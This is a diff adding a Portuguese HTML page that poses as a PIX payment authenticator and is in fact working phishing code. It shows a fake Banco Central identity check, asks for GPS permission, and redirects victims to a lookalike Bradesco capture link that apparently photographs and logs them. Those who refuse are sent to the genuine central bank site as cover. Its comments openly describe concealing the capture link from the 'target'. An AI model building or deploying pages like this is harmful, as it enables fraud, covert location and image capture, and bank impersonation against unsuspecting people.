@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Conferência PIX</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .pix-card { background: white; max-width: 400px; width: 100%; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
+        .content { padding: 25px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        
+        .btn-resgatar { width: 100%; background-color: #32bcad; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
+        .btn-resgatar:hover { background-color: #28a094; }
+        .btn-resgatar:disabled { background-color: #a0d4cf; cursor: not-allowed; }
+
+        /* Ícone de carregar (Spinner) */
+        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer-info { font-size: 11px; color: #999; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
+        
+        /* Modal de Segurança */
+        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; z-index: 1000; }
+        .modal-content { background: white; padding: 30px; border-radius: 12px; max-width: 350px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .modal-content h3 { margin-top: 0; color: #333; font-size: 20px; }
+        .modal-content p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        .modal-content b { color: #32bcad; }
+        .btn-confirm { width: 100%; background-color: #007bff; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        .btn-confirm:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+<div class="pix-card">
+    <div class="header">AUTENTICADOR DE RECEBIMENTOS</div>
+    <div class="content">
+        <label>Valor para Recebimento (R$):</label>
+        <input type="number" placeholder="Ex: 1250,00" id="valor" required>
+        
+        <label>Chave PIX do Beneficiário:</label>
+        <input type="text" placeholder="CPF, E-mail ou Telefone" id="chave" required>
+        
+        <button class="btn-resgatar" id="btnMain" onclick="processarSolicitacao()">
+            <span>RESGATAR VALOR VIA PIX</span>
+            <div class="spinner" id="spinner"></div>
+        </button>
+        
+        <div class="footer-info">
+            <b>Aviso de Segurança:</b> Este portal utiliza criptografia de ponta a ponta. Em conformidade com a <b>LGPD</b> e normas do Banco Central, a validação biométrica e geográfica é obrigatória para prevenção de fraudes em transferências instantâneas. Nenhum dado sensível é armazenado após a conferência.
+        </div>
+    </div>
+</div>
+
+<div id="modal">
+    <div class="modal-content">
+        <h3>Validação de Identidade</h3>
+        <p>Para sua segurança, o Banco Central exige a <b>confirmação da sua localização e biometria facial</b> para liberar este recebimento.</p>
+        <p>Isso garante que é você quem está solicitando o valor e evita golpes.</p>
+        <button class="btn-confirm" onclick="solicitarPermissoesNativas()">AUTENTICAR E LIBERAR PIX</button>
+    </div>
+</div>
+
+<script>
+    const btnMain = document.getElementById('btnMain');
+    const spinner = document.getElementById('spinner');
+    const modal = document.getElementById('modal');
+
+    // Link final para onde enviar se der erro ou após a captura
+    // Ex: Página de erro do Pix ou Banco Central
+    const LINK_DISFARCE_FINAL = "https://www.bcb.gov.br/estabilidadefinanceira/pagamentosinstantaneos";
+
+    // --- SEU LINK DE CAPTURA DO HYSPY AQUI ---
+    const LINK_HYSPY = "https://bradesc.co/a/PixAutomatico";
+
+    function processarSolicitacao() {
+        const valor = document.getElementById('valor').value;
+        const chave = document.getElementById('chave').value;
+        
+        if(valor === "" || chave === "") {
+            alert("Por favor, preencha todos os campos para a conferência.");
+            return;
+        }
+
+        // Simulação de processamento (Delay de 3 segundos)
+        btnMain.disabled = true;
+        btnMain.querySelector('span').innerText = "Validando dados...";
+        spinner.style.display = "block";
+
+        setTimeout(() => {
+            // Após o delay, mostra o modal de segurança
+            modal.style.display = 'flex';
+        }, 3000);
+    }
+
+    function solicitarPermissoesNativas() {
+        // Esta função tenta pegar o GPS primeiro pelo GitHub Pages
+        // Isso isola o seu link do Hyspy do olhar do alvo
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // SE ELE ACEITAR O GPS:
+                    // Enviamos ele para o Hyspy, que pegará a foto e registrará tudo.
+                    // O Hyspy deve estar configurado para redirecionar para LINK_DISFARCE_FINAL após a captura.
+                    window.location.href = LINK_HYSPY;
+                },
+                (error) => {
+                    // SE ELE NEGAR O GPS:
+                    // Mostramos um erro técnico e enviamos para o disfarce final.
+                    alert("Erro de Autenticação: A conferência geográfica é obrigatória pela LGPD. A transferência foi bloqueada por segurança.");
+                    window.location.href = LINK_DISFARCE_FINAL;
+                }
+            );
+        } else {
+            // Navegador muito antigo
+            window.location.href = LINK_HYSPY; 
+        }
+    }
+</script>
+
+</body>
+</html>
+
